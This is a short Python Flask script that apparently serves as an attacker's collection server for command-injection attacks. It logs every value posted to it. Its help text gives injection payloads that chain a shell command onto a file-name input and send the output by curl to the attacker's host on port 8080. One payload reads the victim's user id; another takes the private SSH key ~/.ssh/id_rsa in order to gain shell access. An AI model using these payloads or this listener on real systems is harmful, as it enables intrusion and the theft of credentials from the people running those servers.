from flask import Flask
from flask import request

app = Flask(__name__)

help = """
pip install flask
run server
in order to test a command injection
append this into the vulnerable input:
p=$(command); curl http://c.i.d.r:8080/ -d 'output: "'"$p"'"'

eg scenario: You can search for a file in the system in an input field, in that input field you add this
mytext.txt;p=$(id); curl http://c.i.d.r:8080/ -d 'output: "'"$p"'"'
which will return the id of the user who is running the server
Then you can gain shell access with this:
mytext.txt;p=$(cat ~/.ssh/id_rsa); curl http://c.i.d.r:8080/ -d 'output: "'"$p"'"'
"""


@app.route('/', methods=['GET', 'POST'])
def logData():
    with open('log.txt', 'a') as f:
        for i in request.values:
            f.write(i + ': ' + request.values[i] + '\n')
        return "200"


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=8080)
